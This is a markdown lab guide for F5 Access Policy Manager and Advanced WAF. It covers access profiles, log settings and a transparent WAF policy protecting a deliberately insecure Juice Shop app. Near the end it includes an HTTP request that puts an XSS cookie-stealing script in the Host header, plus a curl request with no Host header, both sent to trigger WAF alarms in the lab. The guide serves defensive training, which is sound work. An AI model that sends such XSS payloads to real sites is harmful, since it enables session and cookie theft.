# THIS IS UNDER CONSTRUCTION

# F5-Access-Policy-Manager-APM-Solution-Guide


# Welcome to the Access Policy Manager (APM) lab guide.

The following labs and exercises will instruct you on how to configure and troubleshoot various APM use cases. This guide is intended to complement lecture material provided during the course as well as a reference guide that can be referred to after the class as a basis for configuring Access solutions in your own environment.

[Original Lab Guide](https://github.com/f5devcentral/f5-agility-labs-iam)



### Class 1 – API Protection
  * Module 1: API Security AWAF and APM modules
### Class 2 – Access Policy Manager Solution (F5 APM)
  * Module 1: APM Overview
  * Module 2: Building a Basic Access Policy
  * Module 3: Server-Side Single Sign-On
  * Module 4: Identity Federation sample use case

# Environment Overview

## UDF Blueprint

## Access Labs & Solutions (Version 16.0)

## Lab Topology

![image](https://user-images.githubusercontent.com/51786870/210523646-afd46189-003d-4d8a-a3f3-6f023cde63ab.png)

The following components have been included in your lab environment:

**Note**

`BIG-IP2 and BIG-IP6 are offline by default. Only boot these BIG-IPs when the lab specifies to do so.`

4 x F5 BIG-IP VE (v16.0)
1 x Windows Server 2016 - jumphost.f5lab.local
1 x Windows 2016 Server - dc1.f5lab.local (AD, CA, OCSP & internal DNS)
1 x Windows 2016 Server - iis.f5lab.local
1 x Centos 7 - web.f5lab.local

## Lab Components

## The following table lists VLANS, IP Addresses and Credentials for all components:

## jumpbox.f5lab.local	
Management 10.1.1.10
External 10.1.10.10
Internal 10.1.20.10

Credentials:
f5lab\user1	user1
f5lab\user2	user2
f5lab\admin	admin
## bigip1.f5lab.local	
Management 10.1.1.4
External
10.1.10.4
10.1.10.100
10.1.10.101
10.1.10.102
10.1.10.103
10.1.10.104
10.1.10.105
10.1.10.106
10.1.10.107
10.1.10.108
10.1.10.109
10.1.10.110
10.1.10.111
10.1.10.112
10.1.10.113
Internal 10.1.20.4

Credentials: admin/admin
 
## bigip2.f5lab.local	
Management 10.1.1.5
External
10.1.10.5
10.1.10.200
10.1.10.201
10.1.10.202
10.1.10.203
10.1.10.204
10.1.10.205
10.1.10.206
10.1.10.207
10.1.10.208
10.1.10.209
10.1.10.210
10.1.10.211
10.1.10.212
10.1.10.213
Internal 10.1.20.5

Credentials: admin/admin
 
## bigip5.f5lab.local	
Management 10.1.1.11
External
10.1.10.11
10.1.10.99
Internal
10.1.20.11
10.1.20.99

Credentials: admin/admin
 
## bigip6.f5lab.local	
Management 10.1.1.12
External
10.1.10.12
10.1.10.199
Internal
10.1.20.12
10.1.20.199

Credentials: admin/admin
 
## dc1.f5lab.local	
Management 10.1.1.7
Internal 10.1.20.7

Credentials: admin/admin
 
## iis.f5lab.local	
Management 10.1.1.6
Internal
10.1.20.6
10.1.20.16

Credentials: admin/admin
 
## web.f5lab.local	
Management 10.1.1.9
Internal
10.1.20.9
10.1.20.19

Credentials: admin/admin
 
## radius.f5lab.local	
Management 10.1.1.8
Internal
10.1.20.8
10.1.20.18

Credentials: admin/admin
 
# Lab 1: APM GUI Overview
Objectives
The intention of this lab will be to show how to enable Access Policy Manager (APM) through resource provisioning. Next we will explore all the components within the Access left menu. This is not a deep dive on the components but an overview of the components, features and concepts of APM.

Setup Lab Environment
To access your dedicated student lab environment, you will need a web browser and Remote Desktop Protocol (RDP) client software. The web browser will be used to access the Unified Demo Framework (UDF) Training Portal. The RDP client will be used to connect to the jumphost, where you will be able to access the BIG-IP management interfaces (HTTPS, SSH).

1. Click DEPLOYMENT located on the top left corner to display the environment

2. Click ACCESS next to jumphost.f5lab.local

![image](https://user-images.githubusercontent.com/51786870/210525081-9bc87b68-6ef8-4226-a1ed-01364467fcb2.png)

3. Select your RDP resolution.

4. The RDP client on your local host establishes a RDP connection to the Jump Host.

5. Login with the following credentials:

User: f5lab\user1
Password: user1

6. After successful logon the Chrome browser will auto launch opening the site **https://portal.f5lab.local**. This process usually takes 30 seconds after logon.

7. Click the Classes tab at the top of the page. Scroll down the page until you see 101 Intro to Access Foundational Concepts on the left.

![image](https://user-images.githubusercontent.com/51786870/210526547-33013d9a-5de4-4ad1-bc21-73678de82f76.png)

8. Hover over tile APM GUI Overview. A start and stop icon should appear within the tile. Click the Play Button to start the automation to build the environment

![image](https://user-images.githubusercontent.com/51786870/210526785-3891470b-c0c2-4f49-966a-84318fb1306a.png)

9. After the click it may take up to 30 seconds before you see processing

![image](https://user-images.githubusercontent.com/51786870/210526877-63fe129a-7f9b-419b-996c-62fa21dfcb2a.png)

10. Scroll to the bottom of the automation workflow to ensure all requests succeeded. If you experience errors try running the automation a second time.

![image](https://user-images.githubusercontent.com/51786870/210527173-850b0cfe-72d7-4fe2-87e0-554e86748828.png)

## Task 1: Resource Provisioning¶
Access Policy Manager (APM) is a module available for use on the BIG-IP platform (Hardware and Virtual). Unlike other modules, APM can be provisioned with limited functionality on any BIG-IP platform without a specific license (see F5 KB15854). APM is licensed based on the number of Access Sessions and Concurrent Users Sessions (see APM Operations Guide). You can provision APM limited and immediately start using all the functions of APM with a limitation of 10 Access and Concurrent user session.

**Important**

`APM has already been provisioned for this lab. The next step would be completed if you are provisioning on your own BIG-IP.`

1. Open new tab and log in to bigip1.f5lab.local with administrative credentials provided

2. On the left menu navigate to System –> Resource Provisioning

Click box and on the drop down next to the module and choose Nominal

**Note**

`In most use cases you will want to use Nominal for provisioning modules. What does each setting mean?`

**Dedicated**	Specifies that all resources are dedicated to the module you are provisioning. For all other modules, the level option must be set to none.

**Minimum**	Specifies that you want to provision the minimum amount of resources for the module you are provisioning.

**Nominal**	Specifies that you want to share all of the available resources equally among all of the modules that are licensed on the unit.

![image](https://user-images.githubusercontent.com/51786870/210527769-df257591-d1ec-4896-9253-b6184bd5843a.png)

4. Before you click on Submit note that this operation will halt operations while the module provisions. Do not do this on an active unit processing traffic unless you are in an outage window. This will not require a reboot but will take approximately 1 to 5 minutes to complete.

![image](https://user-images.githubusercontent.com/51786870/210527834-8ea519f0-b4ad-40f3-8fe0-e2911a11a6fa.png)

**Note**

`Resource Provisioning is not a synced item between HA pairs. You will need to provision the module on all devices in the cluster.`

## Task 2: Guided Configuration¶

Access Guided Configuration (AGC) provides an easy way to create BIG-IP configurations for categories of Access use cases. This feature is an independent release from TMOS and requires updates for new configurations from time to time. To find updates and expanded use cases it will be necessary to download and install updates from https://downloads.f5.com. In this task we are going to explore the menu and take a look at a few options. We will not be deploying any of these solutions in this lab.

1. Go to Access –> Guided Configuration

![image](https://user-images.githubusercontent.com/51786870/210528155-38bebe19-f3da-4c4d-b8a8-b6dfb091426e.png)

2. A set of tiles appears at top listing the areas of use cases where Guided Configuration can be used

![image](https://user-images.githubusercontent.com/51786870/210528190-f874cb23-d500-4d97-84a2-9b5d10d765ec.png)

3. Click on the Federation Tile.

4. Under this tile are several Identity Federation use cases available. Each use case has an accompanying guide to walk you through the configuration. This is not designed for already deployed applications but used for new deployments. All the components needed to create the configuration will be deployed on the BIG-IP through this guide. Editing and configuring of the solution will be maintained within this menu.

5. Click on SAML Service Provider

![image](https://user-images.githubusercontent.com/51786870/210530698-9c5aadea-effd-48c8-ab8f-fd927cf5cd79.png)

6. Here you will find there are couple topologies. SAML SP Initiated and SAML IdP Initiated.

![image](https://user-images.githubusercontent.com/51786870/210530531-dc493270-93d6-4de6-95d9-00e7bb86fbaf.png)
![image](https://user-images.githubusercontent.com/51786870/210530544-c5645f96-08db-4934-8336-59e0abab6dd0.png)

7. If there are any required configuration pieces missing to complete guided configuration they will appear in the right panel

![image](https://user-images.githubusercontent.com/51786870/210530774-28eb940a-525f-4a34-8c07-5afdfb9dd2a7.png)

8. Below the topologies you will find all the components that will be configured using the guided configured

![image](https://user-images.githubusercontent.com/51786870/210530815-c38ae60e-79c4-4a4c-8f4c-4018b9d7e93c.png)

9. From here you would click next to begin configuration. (We will explore this further in next labs)

10. Click on the Guide Configuration bread crumb at the top of the screen to return to the main menu.

11. Click on the Zero Trust tile.

12. Zero trust follows the principle never trust, always verify and thus enforces authentication and verification for every user or device attempting to access resources whether from within or outside of the network.

**About Identity Aware proxy**

`The easiest way to create policies to support zero trust security is to use the Zero Trust-Identity Aware Proxy template in Access Guided Configuration. The template takes you through the steps needed to create an Identity Aware Proxy. Access Policy Manager (APM) acts as the Identity Aware Proxy helping to simplify client access to both multi-cloud and on-premise web applications, and securely manage access from client devices.`

`On APM, you can develop per-request policies with subroutines that perform different levels of authentication, federated identity management, SSO (single sign on), and MFA (multi-factor authentication) depending on the requirements. Subroutines perform continuous checking based on a specified duration or gating criteria. Policies can be as complex or as simple as you need them to be to provide seamless yet secure access to resources. Refer to Implementing Zero Trust with Per-Request Policies for many examples of per-request policies that implement different aspects of zero trust.`

`For additional security, device posture checking provides instantaneous device posture information. The system can continuously check clients to be sure, for example, that their antivirus, firewall, and patches meet company requirements, ensuring that the device maintains trust at all times.`

`On the client side, F5 Access Guard allows real-time posture information to be inspected with per-request policy subroutines. F5 Access Guard generates posture information asynchronously, and transparently transmits it to chosen APM server endpoints using special HTTP headers. Refer to BIG-IP Access Policy Manager: Configuring F5 Access Guard for details on client requirements.`

13. Click on the Identity Aware Proxy configuration option

14. There are two topologies available:

**Single Proxy**
![image](https://user-images.githubusercontent.com/51786870/210531235-d0fc65fe-9434-4083-928e-cb37c40ff4ee.png)
![image](https://user-images.githubusercontent.com/51786870/210531222-a027210f-912a-4a13-b414-6d318f3ad92e.png)

**Multi-Proxy
**![image](https://user-images.githubusercontent.com/51786870/210531361-e3f0f14d-d0ce-460d-8f11-ced0232ee3b9.png)
![image](https://user-images.githubusercontent.com/51786870/210531379-241d4758-c194-41e0-955b-597a36fafc9d.png)

15. Proceeding with this configuration will create a number of object as seen here.

**Note**

`If you are interested in learning more on this specific solution please consider taking the Zero Trust Identity Aware Proxy class.`

![image](https://user-images.githubusercontent.com/51786870/210531744-7519398e-761b-4d1b-8adb-b32385df5025.png)

**Note**

`Webtop is available as of version 16.0`

## Task 3: Overview

The Overview menu is where an administrator can view active sessions, previous sessions, and view various reports.

1. Click on Access –> Overview from the left menu

2. Here is where we would see Active Sessions. When users login to applications using APM policies the sessions will appear in this pane.

![image](https://user-images.githubusercontent.com/51786870/210531967-4bfb37d6-19da-4532-9676-7de34462a8c4.png)

3. This is also where you will be able to kill sessions. For more on logging see next lab

![image](https://user-images.githubusercontent.com/51786870/210532060-68664679-c485-4498-9d59-34c36829aba7.png)

4. Click on Access –> Overview –> Access Report

5. This section will give you details on the all sessions active and inactive. Each log item is a message on the policy flow as a user walks through an Access policy. (We will cover Per Session policies in in more detail later).

6. You will be prompted to enter a time period to run the report

![image](https://user-images.githubusercontent.com/51786870/210532265-ba4cc40b-f640-4f49-b189-bd1ab4c9feda.png)

**Note**

`This is how you can view past sessions. Pick a time frame and run a report.`

7. There are two other reporting functions in this screen, **OAuth Report** and **SWG Reports**. We will not cover these reports in this lab.

8. The last section is Event Logs.

**Note**

`URL Request Logs is part of SWG functionality and will not be covered in this lab`

9. From the top menu bar Click on the drop down next to **Event Logs** and choose **Settings**. This is where you can create logging profiles for access policies. From here you can specify what information to collect and to what detail.

10. Click the **Create** button

11. We will create a new APM Log profile

![image](https://user-images.githubusercontent.com/51786870/210532686-05e808fc-e52b-4e17-8ea3-2e4beb8c6792.png)

| General Information |	Name	| basic_log_profile |
| ------------------ | ----- | ----------------- |
|	  |		Enable Access System Logs	|	Check box |
|	Access System Logs	|	Publisher	|	/Common/sys-db-access-publisher |
|	|		Access Policy |		Debug |
|	|	 	ACL	|	|	Notice |
|	|	 	Secure Web Gateway	|	Notice |
|	|	 	OAuth	|	Notice |
|	|	 	VDI	|	Notice |
|	|	 	ADFS Proxy	|	Notice |
|	|	 	Per-Request Policy	|	Notice |
|	|	 	SSO	|	Notice |
|	|	 	ECA	|	Notice |
|	|	 	PingAccess Profile	|	Notice |
|	|	 	Endpoint Management System	|	Notice |
|	Access Profile	|	Selected	|	(leave this blank for now) |


**Note**

`Within the Access System Logs section of the log profile is where you can change the logging for various portions of the APM Policies. The one you will use most will be to move Access Policy from Notice to Debug and/or Pre-Request Policy from Notice to Debug. As you can see you can pick and choose what level of notifications you want in your logs. This will impact what you see in Access Reports for a session and what appears in /var/log/apm.`

12. Click OK

13. From the left menu go to Access –> Overview –> Dashboard

![image](https://user-images.githubusercontent.com/51786870/210533121-e4bf61dd-103d-4bcb-a1b5-840a7e5242c9.png)

14. The Dashboard can give you a quick synopsis on Access Session, Network Access Session, Portal Access and Access control Lists.

![image](https://user-images.githubusercontent.com/51786870/210533190-4c88d871-9f08-478a-93db-c3fae08ddc0d.png)

**Note**

`For more reporting on APM stats look to BIG-IQ or exporting logs to 3rd party SIEMs and create your own dashboard.`

## Task 4: Profile/Policies

Profiles and Policies are where we begin to learn about what makes APM function. In order for APM functions to be added to a Virtual server we need to create Access Profiles and Policies. These entities take all the components we will look at below and put them in a logical flow through the Visual Policy Editor (VPE). These entities are things like login pages, authentication, single sign on methods and endpoint checks. To being we have to create an Access Profile. Within that profile we create a per session policy. When that is completed we attach that profile to a Virtual Server.

**Note**

`You can associate one Access Profile (which includes a per-session policy) and one per-request policy per virtual server.`

**Important**

`We will creating objects for use within this task.`

1. From the left menu go to Access –> Profiles/Policies –> Access Profiles (Per-Session Policies)

The per-session policy runs when a client initiates a session. (A per-session policy is also known as an access policy.) Depending on the actions you include in the access policy, it can authenticate the user and perform other actions that populate session variables with data for use throughout the session.

2. Click on the Create button on the far right or the + sign

![image](https://user-images.githubusercontent.com/51786870/210533868-6ad56d0b-56d7-47a0-b6ee-2455655b7ecf.png)

| General Properties	|        Name      	|  server1-psp   |
| ------------------ | ----------------- | -------------- |
|                    |    Profile Type	  |       All      | 
|                    |    Profile Scope	 |     Profile    | 
|                    |Customization Type	|     Modern     | 
| Language Settings	 | Accepted Languages|     English    | 

**Note**

`Customization Type is a newer setting that changes the look and feel of login pages. For the traditional look you can Standard`

![image](https://user-images.githubusercontent.com/51786870/210535592-b0ec4763-2aea-4744-bb76-ad6321e95efd.png)

![image](https://user-images.githubusercontent.com/51786870/210535735-437b3aa3-2fa8-4f25-8c71-47aa6ffff015.png)

3. Click Finished

4. Now we have a basic profile. There were a number of other settings to modify and use in the profile. For now we will focus just on the basics.

5. From the Access Profiles (Per-Session Policies) section locate the server1-psp

6. There are two ways to edit the Policy piece of the profile.

**First way**
| Click on the profile |
| Click on Access Policy from the top menu bar |
| Click on the link to Edit Access Policy for Profile “server1-psp” |
| This will take you to the Visual Policy Editor (VPE) |

**Second way**
| Locate the server1-psp in the Profile list and follow the line to the right. |
| Middle of the line there will be an Edit link |
| Click the Edit link |

7. Close the VPE (we will visit the VPE and policy in more detail later)

8. Return to Access –> Profiles/Policies –> Access Profiles (Per-Session Policies)

9. Click on the server1-psp and explore the settings for the Profile.

**Settings**	- Here you can manage settings for the profile. You may want to change timeouts, max sessions and login attempts. These are settings specifically for this profile.

**Configurations** - These are more advanced options and covered in other labs

**Language Settings**	- You have to set this at creation.


**Note**

`If you are unsure of the settings you need at profile creation you can see that you can return to the profile and make adjustments.`

10. Still in the profile click on SSO/Auth Domain at the top

BIG-IP APM offers a number of Single Sign On (SSO) options. The SSO/Auth Domain tab in a Per Session Profile is where you will select what SSO method to use for your application. In Task 6 we will cover the objects that need to be created in order to associate that SSO method to a policy. At this time the drop down for the SSO Configuration will have a pre-built SSO object we will use later.

**Note**

`We will not discuss Multi-Domain in this lab but you can find more information in later chapters`

11. From the top menu bar click on Logs

12. The log profile we created earlier is now listed here. The Default log profile is attached but we can remove that and add the basic_log_profile

13. Click Update.

That concludes the review of the Per Session policy.

**Note**

`A per session profile is required (even if it is blank) to be deployed with a per request policy`

**Per Request policies**

1. From the left menu navigate to Access –> Profiles/Policies –> Per Request Policies

APM executes per-session policies when a client attempts to connect to the enterprise. After a session starts, a per-request policy runs each time the client makes an HTTP or HTTPS request. Because of this behavior, a per-request policy is particularly useful in the context of a Secure Web Gateway or Zero Trust scenario, where the client requires re-verification on every request, or changes based on gating criteria.

A per-request policy can include a subroutine, which starts a subsession. Multiple subsessions can exist at one time. You can use nearly all of the same agents in per-request policies that you can use in per-session policies. However, most of the agents (including authentication agents) have to be used in a subroutine in per-request policies.

2. Click **Create**

| General Properties	 |         Name        |	server1_prp_policy |
| ------------------- | ------------------- | ------------------ |
|	                    |    Profile Type	    |         All        |
|                     |	Incomplete Action	  |        Deny        |
|                     |	Customization Type	 |      Modern        |
| Language Settings	  | Accepted Languages	 |   English          |

3. Click **Finished**

4. Click **Edit**

#
#
#
#
#
#
#
#
#
##
#
#
#
#
#
#
#
#
#
##









# Welcome to the F5 Advanced Web Application Firewall lab guide

This series of lab exercises is intended to explain and demonstrate key features of F5 Advanced Web Application Firewall. The Blueprint which we use as base for all upcoming Modules is called Advanced WAF Demo v16 + LCC, ML and Device ID+.

The intend is to provide demos on the following content:

[Original Lab Guide](https://rtd-awf.readthedocs.io/en/dev/index.html)

### Getting to Know the Environment
  * Module 1: Lab Topology
  * Module 2: How to Deploy a Solution

### Class 1 - Getting started with WAF, Bot Detection and Threat Campaigns
  * Module 1: Transparent WAF Policy
  * Module 2: IP Intelligence
  * Module 3: Threat Campaigns

### Class 2 - Elevated WAF Protection
  * Module 1: Bot Defense
  * Module 2: Behavioral DOS Protection

### Class 3 - Advanced Protection
  * Module 1: Leaked Credential Check - Credential Stuffing
  * Module 2: Check how Application Traffic Insights works
  * Module 3: Offline Machine Learning
  * Module 4: Protecting Credentials with DataSafe

# Getting to Know the Environment

The F5 Advanced Web Application Firewall Solutions lab is the cornerstone of the Security SME team’s continuing effort to educate F5ers, partners, and customers on ways to efficiently use F5 AWF. This Blueprint is comprised of multiple components including Windows Jumphost, Kali Linux, Docker Enviroment…just to name a few. This blueprint is under content revision in hopes to add additional capabilities for others to either consume existing solutions or to build new solutions that can be shared with the community.


# Module 1: Lab Topology

In this module, we will talk about the Lab Topology of the “Advanced WAF Demo v16 + LCC, ML and Device ID+” UDF Blueprint.

**Note**

`You´ll find different BIG-IPs inside the Blueprint. To maintain the Blueprint and introduce features which are EA, its easier to approach different BIG-IPs rather then configuring the solutions on one BIG-IP.`


### Lab Topology:

### BIG-IP Component

  * `BIG-IP 17.0`

### On this BIG-IP you can run following Demos:

  * Device ID+
  * IP Intelligence
  * Bot Detection Lab
  * Threat Campaigns
  * Transparent WAF Policy
  * Bot Defense
  * Behavioral DoS
  * Login Page protection


This class will focus on a best practice approach to getting started with F5 WAF and application security. This introductory class will give you guidance on deploying WAF services in a successive fashion. This 141 class focuses entirely on the negative security model aspects of WAF configuration.  
This is the 1st class in a three part lab series (141,241,341) based on: [Succeeding with Application Security](https://support.f5.com/csp/article/K07359270) which closely maps to this visualization of layered Application Security.

![119345353-0da70580-bc99-11eb-94fe-59eabaf3c240](https://user-images.githubusercontent.com/51786870/210393984-04c8c0a8-6f5b-4b95-aa85-9ecab960aa3a.png)

## Lab Environment & Topology

`All work is done from the Windows Client, which can be accessed via RDP (Remote Desktop Client) or SSH. No installation or interaction with your local system is required.`

### Environment
  
Windows Client:  
  
  * BURP Community Edition - Packet Crafting
  * curl - command line webclient. Very useful for debugging and request crafting
  * Postman - API Development and request crafting
  
Linux server:  
  
  * Juice Shop running as a container on "Docker + Hackazon for LCC" virtual machine - deliberately insecure application that allows interested developers just like you to test vulnerabilities commonly found in Java-based applications

### Lab Topology
  
The network topology implemented for this lab is very simple. The following components have been included in your lab environment:

1 x Ubuntu Linux 20.04 client.  
1 x F5 BIG-IP VE (v16.0.1) running Advanced WAF with IP Intelligence & Threat Campaign Subscription Services.  
1 x Ubuntu Linux 20.04 server.  

#
# Class 1 - Getting started with WAF, Bot Detection and Threat Campaigns

# Module 1: Transparent WAF Policy
Expected time to complete: 30 minutes

## Exercise 1.1: Transparent Policy
### Objective

  * Create your first WAF Policy
  * Review Learning & Blocking & Policy Building Process settings
  * Implement HTTP Protocol Compliancy checks and test
  * Test with a HTTP Protocol violation plus XSS attack
  * Enable Server Technologies & Attack Signatures
  * Review Reporting
  * Estimated time for completion 30 minutes.

**We will now run the backend app Juice Shop on "Docker + Hackazon for LCC" virtual machine**
1. Navigate to the Web Shell of "Docker + Hackazon for LCC" from the browser after logging in to UDF platform

![image](https://user-images.githubusercontent.com/51786870/210506000-696e00a5-7c85-49f3-b991-051697d061bf.png)

2. Run a container with the Juice Shop application with commands below

`docker pull bkimminich/juice-shop`

![image](https://user-images.githubusercontent.com/51786870/210506537-4f12c0be-57f8-4fea-b26c-97283a7dfe0c.png)

`docker run --rm -p 3000:3000 bkimminich/juice-shop`

![image](https://user-images.githubusercontent.com/51786870/210506727-97ed1d9a-c034-47f8-8ade-11386c710f3f.png)


3. Configure a pool **juiceshop_pool** on BIGIP (**https://10.1.1.9**) using that service as a pool member (**10.1.20.5:3000**)

4. Navigate to **Local Traffic > Pools > Pool List** and click **Create**

![image](https://user-images.githubusercontent.com/51786870/210507341-b9e53b9d-052a-4b9a-969d-f9b7f1eeb83a.png)

5. Go to **Local Traffic > Virtual Servers > Virtual Server List** and modify the **destinaion IP address of "vs_Hackazon_II" to 10.1.10.101**

![image](https://user-images.githubusercontent.com/51786870/210507867-6848c58b-33b0-4dd5-83c7-eaf4eac91cbe.png)

7. Go to **Local Traffic > Virtual Servers > Virtual Server List** and click **Create**. Create a virtual server with the settings below 

![image](https://user-images.githubusercontent.com/51786870/210508519-383a893c-0c58-4d9d-af40-b8f4cb6e9b35.png)


![image](https://user-images.githubusercontent.com/51786870/210508408-eacb21f4-8fa8-44ba-9fc4-a2284ef5f16b.png)

![image](https://user-images.githubusercontent.com/51786870/210508814-db77afce-47e5-47ea-a8a5-01721eaacc37.png)


8. Search for Notepad tool, right click on the app and click "Run as administrator"

![image](https://user-images.githubusercontent.com/51786870/210509098-bea6b633-bc85-4d9c-8c19-2301d0a67ec1.png)

9. Open hosts file and add an entry with the value of  juiceshop.f5demo.com and IP address of 10.1.10.58. Do not delete hackazon.f5demo.com. Save the file.

![image](https://user-images.githubusercontent.com/51786870/210509358-9b2087ab-a9f6-438d-8d65-4345191e00fc.png)

![image](https://user-images.githubusercontent.com/51786870/210509454-ac816cc4-7d6f-40af-a8a8-47aa4b395363.png)


10. Check if the service is running

![image](https://user-images.githubusercontent.com/51786870/210509879-63e77c2a-4add-40a9-b1f3-87660de7ddc8.png)

**We will now configure a Layer 7 WAF policy to inspect the X-Forwarded-For HTTP Header.**

### Create your WAF Policy
1. Navigate to **Security > Application Security > Security Policies** and click the Plus (+) button.
2. Name the policy: **juiceshop_policy**
3. Select Policy Template: **Rapid Deployment Policy** (accept the popup)
4. Select Virtual Server: **insecureApp1_vs**
5. Logging Profiles: **Log all requests**
6. Notice that the Enforcement Mode is already in **Transparent Mode** and Signature Staging is **Enabled**
7. Click **Save**.

![image](https://user-images.githubusercontent.com/51786870/210510306-5c6177e1-41f0-4b21-850c-4c52360b39e8.png)


### Learning & Blocking
We use Rapid Deployment Policy template to create our policy and we deploy it in manual learning mode. This means as violations and/or false positives occur, the system will make suggestions to modify the policy. The admin will manually evaluate the suggestions and Approve, Ignore or Delete them.

1. Navigate to **Security > Application Security > Policy Building > Traffic Learning** and notice that there are no “learning suggestions” displayed yet. Now it’s time to generate some real legitimate user traffic.
2. In the Chrome browser open a new tab, and go to **http://juiceshop.f5demo.com**. Click on **Account** and then **Login**.

![image](https://user-images.githubusercontent.com/51786870/210511011-e0cbfe72-b2de-41c1-a355-9697036f1f8c.png)


3. Next click on **"Not yet a customer?"** and register new user: "student@f5demo.com" with the password **"student"** and Browse around the site and perform several actions as a real user would.

![image](https://user-images.githubusercontent.com/51786870/210511160-5d940ac8-c19b-47a6-8072-7f4f751d030a.png)

![image](https://user-images.githubusercontent.com/51786870/210511528-5d2b7a89-5109-460a-8598-659d9891ce10.png)

4. Click back on the Advanced WAF GUI tab in your browser and refresh the traffic learning screen. If you navigated away or closed the tab, open a new one, login to Advanced WAF and go to: **Security > Application Security > Policy Building > Traffic Learning**.

5. You will see many Suggestions and a learning score that the system assigns based on how many times it has seen an occurence and from what source. You can **Accept, Delete, Ignore** or **Export** the suggestion.
`This is where it usually starts to get a little dicey for a first-time WAF admin. Always look very carefully at the suggested action before deciding on which action to take. It is also helpful to define a whitelist so that the policy can learn quicker and from known trusted sources. You generally do not want the system learning from random and/or hostile Internet traffic and making suggestions to relax the policy.`
6. Notice that most of the learning suggestions involve enabling various HTTP protocol Compliance Checks.
7. Find and select the suggestion for **Enable HTTP protocol compliance check - HTTP Check: No Host header in HTTP/1.1 request**.

![image](https://user-images.githubusercontent.com/51786870/210512098-9c8236d7-bba6-47db-8840-486883d963cb.png)

8. Review the **Suggested Action** and click **Accept** and **Apply Policy**.

9. What just happened and how do you see what changed by who and when? Audit Log of course!
10. Go to **Security > Application Security > Security Policies > Policies List**, click **juiceshop_policy**, go to **Audit Log** tab and review the most recent actions. You can see who, what and when every component within a policy was modified. (This step is not necessary but meant to draw your attention to the audit log)

![image](https://user-images.githubusercontent.com/51786870/210513154-ea99ad4c-e208-41a3-9946-0dc1d9f7a70e.png)

11. Click on the Element Name (blue hyperlink) **No Host header in HTTP/1.1** request This takes you to the Learning and Blocking Settings screen where the check was enabled.

![image](https://user-images.githubusercontent.com/51786870/210513288-065f6352-598a-40f2-baef-fa9f8bd1a111.png)

12. Notice that by default in the Rapid Deployment Policy, learning is enabled for most of the common HTTP Protocol compliancy checks. Also notice that the **Enable** checkbox next to **No Host header in HTTP/1.1** request is now checked.

13. Uncheck the **Learn box** for this violation then **Save** and **Apply** policy.

![image](https://user-images.githubusercontent.com/51786870/210513440-b6dfe3b0-e7d3-4cde-b2fd-996c732d1346.png)

14. Open a Kali linux Web Shell from the UDF platform, and send the following request. This request is being sent without a host header and should now raise a violation in our Event Log rather than a learning suggestion.

```bash
curl -k -H 'Host:' http://10.1.10.58/
```

![image](https://user-images.githubusercontent.com/51786870/210514606-874dc305-c37d-4c36-8a0e-2a377c6eb06a.png)

15. Review the **Alarmed request in Security > Event Logs > Application > Requests**.
![image](https://user-images.githubusercontent.com/51786870/210514759-14261d2d-7e5b-478a-9a0a-65f6e6d06036.png)
16. To review, you just took a learning suggestion and accepted it to enable a protocol compliancy check and then you disabled future learning suggestions for this event. Violations are now alarmed in the Event Logs.
16. Go back to**Security > Application Security > Policy Building > Traffic Learning** You would now typically go through and enable all of the checks that the policy is recommending regarding http protocol compliance and evasion technique detection.
`Remember that your policy is safely in transparent mode so accepting suggestions and enabling checks will only raise alarms and no blocking actions will occur. This is why it is very important to start off transparently until you fully understand the basics of managing a WAF policy.`

### Policy Building Process
One thing you can do to greatly increase the integrity of the learning suggestions is, define trusted IP’s. You can also tell the system to Only learn from trusted IP’s which is a very wise thing to do if you are developing policy on an app that is exposed to untrusted or Internet traffic.

1. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings** and expand the **Policy Building Process** section at the bottom. Here you can see settings that this particular policy is using for learning. Enable "**Advanced**" view. Notice that **Trusted IP Addresses List** is empty.
2. Click the little window/arrow icon next to **Trusted IP Addresses** List is empty.

![image](https://user-images.githubusercontent.com/51786870/210515220-b4ba2d3c-8db0-4a00-963c-c872b1c0b374.png)

3. This takes you to: **Security > Application Security > IP Addresses > IP Address Exceptions**. Click **Create**.
4. For IP Address: **10.0.0.0** and for Netmask: **255.0.0.0**. Check the box for **Policy Builder trusted IP** and click **Add** and **Apply Policy**.

![image](https://user-images.githubusercontent.com/51786870/210515429-3cfcc6ad-14b0-44d1-b7c2-d2db7d9d5821.png)

5. Navigate back to **Security > Application Security > Policy Building > Learning and Blocking Settings** and expand the **Policy Building Process** section. Notice that our newly defined network is now a **Trusted IP**. This will greatly enhance the speed and quality of learning suggestions.
6. Change the view from Basic to Advanced and review all the fine-grained configurations for the **Policy Building Process**.

![image](https://user-images.githubusercontent.com/38420010/119369972-0beb3b00-bcb5-11eb-9cf4-c368a7172654.png)

**You now know how to define a trusted ip and configure the policy building process settings**

### Burp’ing the App
In this section we are going to use the free/community version of an excellent DAST tool; Burp. Unfortunately, the free version does not actually allow DAST but it is still an excellent tool for packet crafting and that’s exactly how we are going to use it.

### Accept the Remaining Learning Suggestions
Go to **Security > Application Security > Policy Building > Traffic Learning** and select all of the remaining suggestions and click **Accept > Accept suggestions** and then **Apply Policy**.

![image](https://user-images.githubusercontent.com/51786870/210516002-469b26b5-1f07-46a6-92ef-8af052c88dea.png)

### HTTP Compliancy Check - Bad Host Header Value
The **Bad Host Header Value** check is an HTTP Parser Attack and definitely something that should be implemented as part of **Good WAF Security**. It was included in the suggestions you just accepted.

**Risk**: If we allow bad host header values they can be used to Fuzz web servers and gather system information. Successful exploitation of this attack could allow for the execution of XSS arbitrary code.

1. Launch **Burp** from the Desktop. **Do Not click multiple times. It takes a few moments to load**.

![image](https://user-images.githubusercontent.com/51786870/210516327-76bfb7ad-7b47-47c2-8c14-f7a7d46b3287.png)

2. **DO NOT update.**
3. Choose **Temporary Project** and click **Next** and then click **Start Burp**.

![image](https://user-images.githubusercontent.com/51786870/210516409-60b4e392-048e-4395-af3f-9adba0e6d361.png)

4. Click the **Repeater** tab and paste in the following http request (Replace the username and password with credentials you have created.) and click **Send**.
5. A popup window will appear to configure the target details. For host use: **10.1.10.58**. For port use: **80**. **Do not check the Use HTTPS box**.
6. Click **Send**
**XSS in HOST Header**  

```
POST https://10.1.10.58/#/login HTTP/1.1
User-Agent: BestBrowser
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Host: <script>alert(document.cookie);</script>

username=student@f5demo.com&password=student
```

![image](https://user-images.githubusercontent.com/51786870/210516998-8b436fc6-da42-4043-8a99-6d5053e8f337.png)

7. Back in Advanced WAF, browse to **Security > Event Logs > Application > Requests** and review the alert for this Sev5 attack. Note the alert severity is much higher (5) for this attack type due to several violations occuring including HTTP protocol Violations and several XSS signatures.
